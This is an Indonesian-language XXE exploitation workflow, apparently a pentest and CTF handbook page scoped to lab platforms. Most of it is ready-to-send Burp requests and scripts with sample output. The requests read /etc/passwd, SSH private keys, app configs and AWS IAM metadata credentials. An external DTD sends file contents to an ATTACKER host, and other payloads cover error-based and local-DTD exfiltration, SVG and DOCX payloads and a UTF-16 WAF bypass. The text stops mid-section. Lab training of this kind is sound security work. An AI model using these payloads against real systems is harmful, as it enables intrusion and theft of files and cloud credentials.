---
id: "21"
title: "🧬 21 — XXE Workflow"
category: "3. Web Exploitation"
categoryId: "web"
filename: "21_xxe_workflow.md"
refs_out: ["06","07","14a","14b","20","22","60"]
refs_in: ["20","22","30"]
---

← [File 20: XSS](/docs/xss)

# 🧬 21 — XXE Workflow

> **Scope:** HackTheBox, TryHackMe, PortSwigger Academy, Proving Grounds, dan lab yang memberikan izin pengujian. **OS:** Parrot OS XFCE / Debian-based **Tool Utama:** Burp Suite (Community/Pro) + Burp Collaborator / interactsh **Level:** Beginner → Intermediate **Goal:** Identifikasi attack surface → bukti entity resolution → file disclosure → Blind XXE/OOB → SSRF → advanced chains.

---

## ⚡ One-Sentence Rule

> **XXE = XML Parser + Entity Resolution + External Resource Access + Observable Channel.**
> 
> Identifikasi keempat komponen ini sebelum menyentuh payload apapun.

---

## 📚 Daftar Isi

- [Pre-Flight](#-pre-flight-setup-environment)
- [Master Workflow](#️-master-workflow)
- [FASE 0: Attack Surface](#fase-0-identifikasi-attack-surface)
- [FASE 1: Konfirmasi Parser](#fase-1-konfirmasi-xml-parser)
- [FASE 2: File Disclosure](#fase-2-file-disclosure--baca-file-sensitif)
- [FASE 3: Blind XXE](#fase-3-blind-xxe)
- [FASE 4: XXE → SSRF](#fase-4-xxe--ssrf)
- [FASE 5: File Upload XXE](#fase-5-xxe-via-file-upload)
- [FASE 6: Local DTD Repurpose](#fase-6-repurposing-local-dtd)
- [Context-Specific](#-context-specific)
- [Technical Reference](#-technical-reference)
- [Tools & Scripts](#-tools--scripts)
- [Quick CTF Recipe](#-quick-ctf-recipe)
- [Quick Reference Cheatsheet](#-quick-reference--payload-cheatsheet)
- [Troubleshooting](#️-troubleshooting)
- [Final Checklist](#-final-checklist)
- [Cross-Workflow Links](#-cross-workflow-links)

---

## 🔧 Pre-Flight: Setup Environment

```bash
# Jalankan satu kali di awal sesi.
export TARGET="10.10.11.200"
export LHOST="10.10.14.5"       # IP tun0 kamu (VPN HTB/THM)
export LPORT="8000"
mkdir -p ~/xxe_loot/{files,dtd,payloads,notes}
cd ~/xxe_loot

echo "[*] Target: $TARGET | LHOST: $LHOST:$LPORT"
```

Setup Burp Suite:

```text
1. Buka Burp Suite Community/Pro → New Project → Start Burp
2. Proxy → Options → pastikan 127.0.0.1:8080 active
3. Di browser: proxy settings → Manual → 127.0.0.1:8080
4. Browse target → Proxy → HTTP History untuk temukan XML requests
```

---

## 🗺️ Master Workflow

```text
START: Endpoint menerima XML / File Upload
│
├─ FASE 0: Temukan XML attack surface (Burp HTTP History)
│   ├─ [Direct XML POST]     → Fase 1 di Burp Repeater
│   ├─ [File Upload (SVG)]   → Fase 5A (Burp intercept upload)
│   ├─ [File Upload (DOCX)]  → Fase 5B (manual + repack + upload)
│   └─ [SOAP endpoint]       → Context-Specific: SOAP
│
├─ FASE 1: Konfirmasi Entity Resolution (Burp Repeater)
│   ├─ [Internal entity resolved] → Test external entity
│   │   ├─ [File content di response] → FASE 2 (File Disclosure)
│   │   ├─ [Kosong/tidak di-reflect]  → FASE 3 (Blind XXE)
│   │   └─ [Error visible]           → Fase 3.4 (Error-Based)
│   ├─ [DOCTYPE diblok]   → XInclude (Fase 1.4)
│   └─ [XML tidak diterima] → File Upload path
│
├─ FASE 2: File Disclosure
│   ├─ [/etc/passwd, config files] → User enum, credentials → pivot
│   ├─ [SSH private key]           → Direct SSH login → SSH workflow
│   └─ [PHP source + special chars] → php://filter/base64-encode
│
├─ FASE 3: Blind XXE
│   ├─ [OOB HTTP works]   → External DTD exfiltration (3.3)
│   ├─ [OOB blocked]      → DNS via Collaborator / interactsh (3.2)
│   ├─ [Error visible]    → Error-based exfil (3.4)
│   └─ [No outbound]      → Repurpose Local DTD (3.5 / Fase 6)
│
├─ FASE 4: XXE → SSRF
│   ├─ [Internal service] → Probe endpoint (Burp Intruder port sweep)
│   └─ [Cloud metadata]   → IAM credentials (AWS IMDSv1)
│
├─ FASE 5: File Upload XXE
│   ├─ [SVG]   → Burp intercept + inject DOCTYPE (5A)
│   └─ [DOCX]  → Manual edit XML + repack + upload (5B)
│
└─ FASE 6: Repurposing Local DTD
    └─ [No outbound + error visible + local DTD ada] → Override entity → exfil
```

**Testing Hierarchy — Jangan loncat step:**

```text
LEVEL 0  Normal XML baseline
  ↓
LEVEL 1  Internal Entity  <!DOCTYPE + &test;>
  ↓
LEVEL 2  External Entity  file:///etc/hostname
  ↓
LEVEL 3  External DTD + OOB callback
  ↓
LEVEL 4  Data exfiltration (OOB atau Error-based)
  ↓
LEVEL 5  SSRF  http://127.0.0.1:PORT/
  ↓
LEVEL 6  Local DTD repurpose (tanpa outbound)
```

---

## ══════════════════════════════════════

## FASE 0: Identifikasi Attack Surface

## ══════════════════════════════════════

> **Tujuan:** Temukan semua endpoint XML sebelum testing.

### Langkah 0.1 — Gunakan Burp HTTP History

```text
1. Browse seluruh aplikasi dengan Burp proxy aktif
2. Proxy → HTTP History
3. Filter Column "Mime Type" → cari: XML, HTML (SOAP), Text
4. Filter Column "Params" → cari: body dengan XML content
5. Cari request Content-Type:
   - application/xml
   - text/xml
   - application/soap+xml
6. Juga cari di "Response" tab: SOAPAction, WSDL links
```

**OUTPUT BERHASIL ✅ — XML endpoint ditemukan:**

```text
POST /product/stock       Content-Type: application/xml
POST /api/import          Content-Type: application/xml
POST /soap/service        SOAPAction: header present
GET  /upload              ada form upload file
```

➡️ Catat semua endpoint. Lanjut ke **Langkah 0.2**

---

### Langkah 0.2 — Identifikasi File Upload

```text
Di Burp HTTP History, cari request:
1. POST ke /upload, /avatar, /import, /document
2. Content-Type: multipart/form-data dengan file
3. Response yang berisi preview URL atau file path
```

**OUTPUT BERHASIL ✅ — Upload endpoint ditemukan:**

```text
POST /my-account/avatar    → upload avatar (kandidat SVG → Fase 5A)
POST /api/document         → upload dokumen (kandidat DOCX → Fase 5B)
```

> **Format file yang mungkin memproses XML server-side:** SVG, XML, XHTML, DOCX, XLSX, ODT

---

## ══════════════════════════════════════

## FASE 1: Konfirmasi XML Parser

## ══════════════════════════════════════

> **Tujuan:** Konfirmasi entity resolution step by step. JANGAN loncat.

### Langkah 1.1 — Level 0: Baseline XML (Burp Repeater)

Temukan XML request di HTTP History → klik kanan → **Send to Repeater**

**Di Burp Suite → Repeater:**

```http
POST /product/stock HTTP/1.1
Host: TARGET
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
    <productId>1</productId>
    <storeId>1</storeId>
</stockCheck>
```

**OUTPUT BERHASIL ✅ — 200 OK, data diproses:**

```http
HTTP/1.1 200 OK
{"price":"$29.99"}
```

➡️ Parser menerima XML. Lanjut ke **Langkah 1.2**

**OUTPUT GAGAL ❌ — 415 Unsupported Media Type:**

➡️ Di Repeater, ubah Content-Type:

```text
Coba: Content-Type: text/xml
Coba: Content-Type: application/xml; charset=utf-8
```

---

### Langkah 1.2 — Level 1: Internal Entity Test

**Di Burp Suite → Repeater:**

```http
POST /product/stock HTTP/1.1
Host: TARGET
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
    <!ENTITY test "XXE_ENTITY_TEST_123">
]>
<stockCheck>
    <productId>&test;</productId>
    <storeId>1</storeId>
</stockCheck>
```

**OUTPUT BERHASIL ✅ — Entity di-resolve:**

```http
HTTP/1.1 200 OK
"Invalid product ID: XXE_ENTITY_TEST_123"
```

➡️ DTD processing aktif! Lanjut ke **Langkah 1.3**

**OUTPUT GAGAL ❌ — Entity literal muncul atau DOCTYPE ditolak:**

```text
{"name":"&test;"}
```

atau

```text
{"error":"DOCTYPE is disallowed"}
```

➡️ Coba **XInclude (Langkah 1.4)** atau **File Upload (Fase 5A/5B)**

---

### Langkah 1.3 — Level 2: External Entity / File Read

**Di Burp Suite → Repeater:**

```http
POST /product/stock HTTP/1.1
Host: TARGET
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
    <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<stockCheck>
    <productId>&xxe;</productId>
    <storeId>1</storeId>
</stockCheck>
```

**OUTPUT BERHASIL ✅ — File dibaca:**

```http
HTTP/1.1 200 OK
"Invalid product ID: web01"
```

➡️ **XXE CONFIRMED!** Lanjut ke **Fase 2** (baca file sensitif)

**OUTPUT BERHASIL ✅ — Ada response tapi entity value kosong:**

```http
{"productId":""}
```

➡️ Entity resolve tapi konten tidak di-reflect. Lanjut ke **Fase 3 (Blind XXE)**

**OUTPUT GAGAL ❌ — Permission denied:**

➡️ Parser resolve entity tapi tidak bisa baca file. Coba:

```xml
<!ENTITY xxe SYSTEM "file:///etc/hosts">
<!ENTITY xxe SYSTEM "file:///proc/version">
```

---

### Langkah 1.4 — Fallback: XInclude (Jika DOCTYPE Diblok)

**Di Burp Suite → Repeater:**

```http
POST /product/stock HTTP/1.1
Host: TARGET
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
    <xi:include parse="text" href="file:///etc/hostname"/>
</foo>
```

atau inject langsung ke field form (jika server embed user input ke XML):

```text
productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
```

**OUTPUT BERHASIL ✅ — XInclude bekerja:**

```http
HTTP/1.1 200 OK
{"result":"web01"}
```

**OUTPUT GAGAL ❌ — XInclude tidak support:**

➡️ Coba SVG upload (Fase 5A) atau DOCX/XLSX (Fase 5B)

> `parse="text"` wajib — tanpanya parser mencoba parse isi file sebagai XML dan biasanya gagal.

---

## ══════════════════════════════════════

## FASE 2: File Disclosure — Baca File Sensitif

## ══════════════════════════════════════

> **Masuk sini setelah Fase 1.3 konfirmasi `file:///` bekerja.**

### Langkah 2.1 — File Disclosure Matrix

Test satu per satu di **Burp Repeater**. Ganti nilai entity di `SYSTEM "..."`.

**Linux — Target Utama:**

```text
file:///etc/passwd           → user list + shell users
file:///etc/hosts            → network topology
file:///etc/hostname         → machine name (start di sini)
file:///proc/net/arp         → ARP table (discover internal IPs)
file:///home/user/.ssh/id_rsa     → SSH private key
file:///root/.ssh/id_rsa          → root SSH key
file:///var/www/html/.env         → app credentials
file:///var/www/html/config.php   → app credentials (gunakan php://filter jika ada <?)
```

**Windows — Target Utama:**

```text
file:///C:/Windows/win.ini
file:///C:/Windows/System32/drivers/etc/hosts
file:///C:/inetpub/wwwroot/web.config
file:///C:/xampp/htdocs/config.php
```

**OUTPUT BERHASIL ✅ — /etc/passwd dibaca:**

```text
root:x:0:0:root:/root:/bin/bash
...
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
```

➡️ Identifikasi users yang punya shell (bukan `/nologin`):

```bash
echo 'PASTE_PASSWD_CONTENT' | grep -v 'nologin\|false' | cut -d: -f1
```

---

### Langkah 2.2 — PHP Source Code via php://filter

**Gunakan ini ketika:** file PHP mengandung `<?php`, `>`, `&` yang merusak XML parser.

**Di Burp Suite → Repeater:**

```http
POST /product/stock HTTP/1.1
Host: TARGET
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
    <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/config.php">
]>
<stockCheck>
    <productId>&xxe;</productId>
    <storeId>1</storeId>
</stockCheck>
```

**OUTPUT BERHASIL ✅ — Base64 output di response:**

```http
HTTP/1.1 200 OK
"Invalid product ID: PD9waHAKJGRiX2hvc3Q..."
```

Decode di terminal:

```bash
echo 'PD9waHAKJGRiX2hvc3Q...' | base64 -d
```

Output:

```php
<?php
$db_host = "localhost";
$db_user = "admin";
$db_pass = "SuperSecret2024!";
```

---

## ══════════════════════════════════════

## FASE 3: Blind XXE

## ══════════════════════════════════════

> **Masuk sini jika: entity di-resolve tapi output tidak terlihat di response.**

### Langkah 3.1 — Setup OOB Listener

**Terminal 1 — DTD Server:**

```bash
mkdir -p ~/xxe_loot/dtd
cat > ~/xxe_loot/dtd/xxe.dtd << 'EOF'
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; send SYSTEM 'http://ATTACKER:8000/?d=%file;'>">
%eval;
%send;
EOF

cd ~/xxe_loot/dtd && python3 -m http.server 8000
```

Atau gunakan **Burp Collaborator** (Pro): Burp Menu → Collaborator client → Copy domain.

---

### Langkah 3.2 — Konfirmasi OOB Connectivity

**Di Burp Suite → Repeater:**

```http
POST /product/stock HTTP/1.1
Host: TARGET
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "http://ATTACKER:8000/xxe-test">
]>
<stockCheck>
    <productId>&xxe;</productId>
    <storeId>1</storeId>
</stockCheck>
```

**OUTPUT BERHASIL ✅ — Callback masuk di terminal:**

```text
10.10.11.200 - - "GET /xxe-test HTTP/1.1" 200 -
```

➡️ Outbound HTTP confirmed! Lanjut ke **Langkah 3.3**

**OUTPUT GAGAL ❌ — Tidak ada callback (silence):**

➡️ Egress filtered. Coba DNS via Burp Collaborator:

```xml
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "http://YOUR_COLLABORATOR_DOMAIN/">
]>
```

Di Collaborator window → klik "Poll now" → lihat DNS query masuk.

Jika DNS juga blocked → coba **Error-Based (3.4)** atau **Local DTD Repurpose (3.5)**

---

### Langkah 3.3 — Blind XXE via External DTD

**Di Burp Suite → Repeater:**

```http
POST /product/stock HTTP/1.1
Host: TARGET
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo SYSTEM "http://ATTACKER:8000/xxe.dtd">
<stockCheck>
    <productId>1</productId>
    <storeId>1</storeId>
</stockCheck>
```

**OUTPUT BERHASIL ✅ — DTD request + data callback:**

```text
10.10.11.200 - - "GET /xxe.dtd HTTP/1.1" 200 -
10.10.11.200 - - "GET /?d=web01 HTTP/1.1" 200 -
```

Data `web01` = isi `/etc/hostname`.

➡️ Ganti file target di `xxe.dtd`:

```bash
# Target /etc/passwd
sed -i 's|file:///etc/hostname|file:///etc/passwd|' ~/xxe_loot/dtd/xxe.dtd

# Target SSH private key
sed -i 's|file:///etc/hostname|file:///home/user/.ssh/id_rsa|' ~/xxe_loot/dtd/xxe.dtd

# Target PHP config (base64 via php wrapper)
sed -i 's|file:///etc/hostname|php://filter/convert.base64-encode/resource=/var/www/html/config.php|' ~/xxe_loot/dtd/xxe.dtd
```

Kirim ulang payload di Repeater dan observe terminal callback.

> **Mengapa `&#x25;` di xxe.dtd?** Parameter entity tidak bisa di-nest langsung di Internal DTD Subset. `&#x25;` adalah HTML entity untuk `%`, memungkinkan deklarasi nested entity. Lihat [Technical Reference: Parameter Entity Rules](#parameter-entity-rules--trick).

---

### Langkah 3.4 — Blind XXE via Error Messages (No Outbound)

**Gunakan jika:** tidak bisa outbound tapi ada **error message terlihat di response**.

**Di Burp Suite → Repeater:**

```http
POST /product/stock HTTP/1.1
Host: TARGET
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY % file SYSTEM "file:///etc/passwd">
    <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
    %eval;
    %error;
]>
<stockCheck>
    <productId>1</productId>
    <storeId>1</storeId>
</stockCheck>
```

**OUTPUT BERHASIL ✅ — Error mengandung file content:**

```http
HTTP/1.1 400 Bad Request

"XML parser error: failed to load external entity
'file:///nonexistent/root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:...'"
```

➡️ `/etc/passwd` bocor di error! Ganti `file:///etc/passwd` ke target lain.

---

### Langkah 3.5 — Local DTD Repurpose (No Outbound + Error Visible)

**Gunakan jika:** tidak ada outbound sama sekali tapi ada error message. Detail → **Fase 6**.

**Di Burp Suite → Repeater:**

```http
POST /product/stock HTTP/1.1
Host: TARGET
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
    <!ENTITY % ISOamso '
        <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
    '>
    %local_dtd;
]>
<stockCheck>
    <productId>1</productId>
    <storeId>1</storeId>
</stockCheck>
```

**OUTPUT BERHASIL ✅ — Data bocor tanpa outbound:**

```http
HTTP/1.1 400 Bad Request
"failed to load 'file:///nonexistent/root:x:0:0:root:/root:/bin/bash...'"
```

---

## ══════════════════════════════════════

## FASE 4: XXE → SSRF

## ══════════════════════════════════════

> **Masuk sini setelah `file:///` bekerja, untuk probe internal services.**

### Langkah 4.1 — Test SSRF ke Localhost

**Di Burp Suite → Repeater:**

```http
POST /product/stock HTTP/1.1
Host: TARGET
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
    <!ENTITY xxe SYSTEM "http://127.0.0.1:8080/">
]>
<stockCheck>
    <productId>&xxe;</productId>
    <storeId>1</storeId>
</stockCheck>
```

**OUTPUT BERHASIL ✅ — Internal service ditemukan:**

```http
HTTP/1.1 200 OK
"Invalid product ID: <!DOCTYPE html><html><title>Internal Admin</title>..."
```

➡️ Port open! Explore endpoint-nya.

**Port sweep via Burp Intruder:**

```text
1. Di Repeater → klik kanan → Send to Intruder
2. Tab Positions → highlight PORT: "http://127.0.0.1:§8080§/"
3. Tab Payloads → Numbers: 1-65535 (atau common port list)
4. Start Attack → sort by Response Length → panjang berbeda = port open
```

**Common internal ports:**

```text
80, 443, 8080, 8000, 3000    → web services
6379                          → Redis
27017                         → MongoDB
9200                          → Elasticsearch
3306                          → MySQL
5432                          → PostgreSQL
```

**Response indicators:**

```text
HTML/JSON content   → port open, ada service
"connection refused" → port closed
timeout             → port filtered
```

---

### Langkah 4.2 — AWS Cloud Metadata

**Di Burp Repeater:**

```http
POST /product/stock HTTP/1.1
Host: TARGET
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
    <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<stockCheck>
    <productId>&xxe;</productId>
    <storeId>1</storeId>
</stockCheck>
```

**OUTPUT BERHASIL ✅ — Metadata accessible:**

```http
HTTP/1.1 200 OK
"ami-id\nami-launch-index\nhostname\niam/"
```

➡️ Lanjut ambil IAM credentials:

```xml
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
```

Dapat role name → ambil credentials:

```xml
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME">
```

> **AWS IMDSv2:** Butuh PUT request dengan header token — tidak bisa via XXE karena parser hanya GET.
> 
> **GCP:** `http://metadata.google.internal/computeMetadata/v1/`

---

## ══════════════════════════════════════

## FASE 5: XXE via File Upload

## ══════════════════════════════════════

### Fase 5A — SVG Upload (Burp Suite)

**Step 1 — Intercept upload di Burp:**

```text
1. Proxy → Intercept → ON
2. Upload file SVG valid kecil di browser
3. Request tertangkap → Send to Repeater
4. Proxy → Forward
```

**Step 2 — Modify di Repeater:**

```http
POST /my-account/avatar HTTP/1.1
Host: TARGET
Content-Type: multipart/form-data; boundary=----Boundary

------Boundary
Content-Disposition: form-data; name="avatar"; filename="xxe.svg"
Content-Type: image/svg+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
    <text x="10" y="30" font-size="10">&xxe;</text>
</svg>
------Boundary--
```

**Step 3 — Klik Send, akses preview URL:**

```http
GET /files/avatars/xxe.svg HTTP/1.1
```

**OUTPUT BERHASIL ✅ — Data muncul di SVG preview:**

```http
HTTP/1.1 200 OK
<svg>...<text>root:x:0:0:root:/root:/bin/bash...</text></svg>
```

**Blind SVG XXE (jika preview tidak di-render):**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg SYSTEM "http://ATTACKER:8000/xxe.dtd">
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
    <text x="10" y="30">test</text>
</svg>
```

Upload → cek terminal OOB server apakah ada request ke `/xxe.dtd`.

---

### Fase 5B — DOCX Upload

**Step 1 — Buat DOCX payload di terminal:**

```bash
mkdir -p /tmp/xxe_docx/word /tmp/xxe_docx/_rels

cat > /tmp/xxe_docx/word/document.xml << 'EOF'
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE w:document [
    <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
  <w:body>
    <w:p>
      <w:r>
        <w:t>&xxe;</w:t>
      </w:r>
    </w:p>
  </w:body>
</w:document>
EOF

cat > /tmp/xxe_docx/\[Content_Types\].xml << 'EOF'
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Default Extension="xml" ContentType="application/xml"/>
  <Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>
</Types>
EOF

cat > /tmp/xxe_docx/_rels/.rels << 'EOF'
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/>
</Relationships>
EOF

cd /tmp/xxe_docx && zip -r /tmp/xxe_payload.docx . > /dev/null
echo "[*] Created: /tmp/xxe_payload.docx"
```

**Step 2 — Upload via Burp Repeater (intercept) atau curl:**

```bash
# curl OK untuk upload file saja
curl -i \
  -F "file=@/tmp/xxe_payload.docx" \
  "http://$TARGET/upload"
```

> **Kondisi yang harus terpenuhi:**
> 
> 1. Aplikasi ekstrak dan proses XML dari DOCX
> 2. Parser tidak disable external entities
> 3. Ada observable response (file preview, conversion result, atau error) Banyak library modern (python-docx, Apache POI baru) sudah disable external entities by default.

---

## ══════════════════════════════════════

## FASE 6: Repurposing Local DTD

## ══════════════════════════════════════

> **Gunakan jika:** tidak ada outbound HTTP sama sekali, ada error message terlihat, dan local DTD exist di server. Teknik ini tidak butuh koneksi keluar sama sekali.

### Langkah 6.1 — Temukan Local DTD

**Di Burp Suite → Repeater (test path DTD satu per satu):**

```http
POST /product/stock HTTP/1.1
Host: TARGET
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
    <!ENTITY xxe SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
]>
<stockCheck>
    <productId>&xxe;</productId>
    <storeId>1</storeId>
</stockCheck>
```

**OUTPUT BERHASIL ✅ — Error menyebut entity di DTD:**

```http
HTTP/1.1 400 Bad Request
"XML parser error: entity 'ISOamso' already defined at ..."
```

➡️ DTD ditemukan! Entity `ISOamso` ada di dalamnya → gunakan entity ini di Langkah 6.2.

**Common local DTD paths — test satu per satu:**

```text
Linux (GNOME/Ubuntu/Debian):
/usr/share/yelp/dtd/docbookx.dtd           ← paling umum (entity: ISOamso)
/usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd
/usr/share/sgml/docbook/sgml-dtd-4.2-*/docbook.dtd
/usr/share/docbook-utils/sgml/docbook/dtd/docbook.dtd
/usr/share/sgml/html/4.01/dtd/html401.dtd

Windows:
C:\Windows\System32\wbem\cimwin32.dtd
C:\Program Files\Common Files\Microsoft Shared\...
```

---

### Langkah 6.2 — Exploit dengan Override Entity

**Di Burp Suite → Repeater:**

```http
POST /product/stock HTTP/1.1
Host: TARGET
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
    <!ENTITY % ISOamso '
        <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
    '>
    %local_dtd;
]>
<stockCheck>
    <productId>1</productId>
    <storeId>1</storeId>
</stockCheck>
```

**OUTPUT BERHASIL ✅ — /etc/passwd di error message:**

```http
HTTP/1.1 400 Bad Request
"failed to load 'file:///nonexistent/root:x:0:0:root:/root:/bin/bash\ndaemon:...'"
```

**Cara kerja:**

```text
1. %local_dtd; → load DTD lokal dari server itu sendiri
2. Sebelum load, entity 'ISOamso' sudah di-override dengan payload kita
3. Ketika DTD lokal diproses, 'ISOamso' sudah berisi logic kita
4. %file; → baca /etc/passwd
5. %error; → buat invalid path berisi isi file → error message berisi data
6. Tidak butuh outbound HTTP sama sekali!
```

---

## 📦 Context-Specific

### XXE di SOAP

**Identifikasi SOAP endpoint:**

```text
Content-Type: text/xml  atau  application/soap+xml
SOAPAction: header present
Body dimulai dengan: <soap:Envelope
Endpoint: /soap, /ws, /service, /wsdl
```

**Inject XXE di SOAP (Burp Repeater):**

```http
POST /soap HTTP/1.1
Host: TARGET
Content-Type: text/xml
SOAPAction: "getUser"

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE soap:Envelope [
    <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
    <soap:Body>
        <getUser>
            <name>&xxe;</name>
        </getUser>
    </soap:Body>
</soap:Envelope>
```

**SOAP Quick Troubleshooting:**

|Error|Solusi|
|---|---|
|415 Unsupported Media Type|Coba `application/soap+xml` ↔ `text/xml`|
|500 Internal Server Error|Buat baseline SOAP request yang valid dulu|
|Empty response|Cek SOAPAction header sesuai endpoint|

---

### XXE di REST (JSON → XML Switch)

**Scenario:** REST endpoint yang mungkin menerima XML jika Content-Type diubah.

**Di Burp Repeater, ubah dari:**

```http
POST /api/user HTTP/1.1
Content-Type: application/json

{"name":"alice"}
```

**Menjadi:**

```http
POST /api/user HTTP/1.1
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
    <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<user>
    <name>&xxe;</name>
</user>
```

**OUTPUT BERHASIL ✅:**

```http
HTTP/1.1 200 OK
{"status":"ok","name":"web01"}
```

---

### XXE di SAML

**Identifikasi SAML:**

```text
Parameter: SAMLResponse atau SAMLRequest (base64-encoded XML)
Endpoint: /saml/acs, /saml/consume, /sso
```

**Approach di Burp:**

```text
1. Intercept SAML request/response di Burp Proxy
2. Tab Decoder → Decode SAMLResponse dari base64
3. Lihat XML structure
4. Inject DOCTYPE + entity sebelum root element
5. Re-encode ke base64
6. Replace di request → Send di Repeater
```

**Fokus testing:**

```text
DOCTYPE support? → coba internal entity test
Entity resolution? → coba file:///etc/hostname
Schema validation ketat? → error mungkin mengandung info
```

> **Penting:** Jangan campur SAML signature bypass dengan XXE. Keduanya adalah kelas masalah yang berbeda. XXE menyerang XML parser; signature bypass menyerang SAML auth logic.

---

## 📚 Technical Reference

### Entity Types

|Type|Deklarasi|Cara Panggil|Context|
|---|---|---|---|
|Built-in|(built-in)|`&lt;` `&gt;` `&amp;` `&quot;` `&apos;`|Di mana saja|
|General entity|`<!ENTITY name "...">`|`&name;`|XML document|
|Parameter entity|`<!ENTITY % name "...">`|`%name;`|DTD only|

**SYSTEM vs PUBLIC:**

```xml
<!ENTITY xxe SYSTEM "file:///etc/passwd">   ← ini yang selalu digunakan di pentest
<!ENTITY xxe PUBLIC "-//Example//EN" "http://example.com/test.dtd">  ← jarang
```

---

### Parameter Entity Rules (% Trick)

> **Rule kritis:** Parameter entity (`%name;`) **TIDAK BISA di-nest** di dalam Internal DTD Subset.

**ILEGAL — akan error:**

```xml
<!DOCTYPE root [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % send SYSTEM "http://attacker/?d=%file;">  ← ERROR: nesting dilarang
  %send;
]>
```

**Solusi — gunakan External DTD:**

File `xxe.dtd` di server attacker:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; send SYSTEM 'http://ATTACKER/?d=%file;'>">
%eval;
%send;
```

**Encoding yang digunakan:**

```text
&#x25; = % (percent sign)  → digunakan karena % literal akan ditolak di dalam nilai entity
&#x26; = & (ampersand)
&#x27; = ' (single quote)
```

Pattern ini kompatibel dengan Java (SAX/DOM), libxml2, dan PHP.

---

### Encoding Bypass

**UTF-16 (WAF Bypass):**

Beberapa WAF filter `<!DOCTYPE` di UTF-8 tapi tidak di encoding lain.

```bash
python3 - << 'PY' > /tmp/payload_utf16.xml
payload = '''<?xml version="1.0" encoding="UTF-16"?>
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<root><data>&xxe;</data></root>
'''
with open('/tmp/payload_utf16.xml', 'wb') as f:
    f.write(payload.encode('utf-16'))
PY
```

> Bytes yang dikirim harus benar-benar UTF-16 — ganti declaration saja tidak cukup.

**CDATA — bukan teknik XXE:**

CDATA berguna untuk menampilkan output yang mengandung karakter XML, bukan sebagai teknik bypass:

```xml
<![CDATA[text with <, >, & characters]]>
```

Jika butuh CDATA dengan entity output, gunakan DTD trick khusus (hanya bekerja pada parser tertentu) — bukan path utama.

---

### Chaining Overview

```text
XXE + File Read → Credential Exposure
    file:///var/www/html/config.php → DB credentials → pivot ke DB

XXE + SSRF → Internal Admin Access
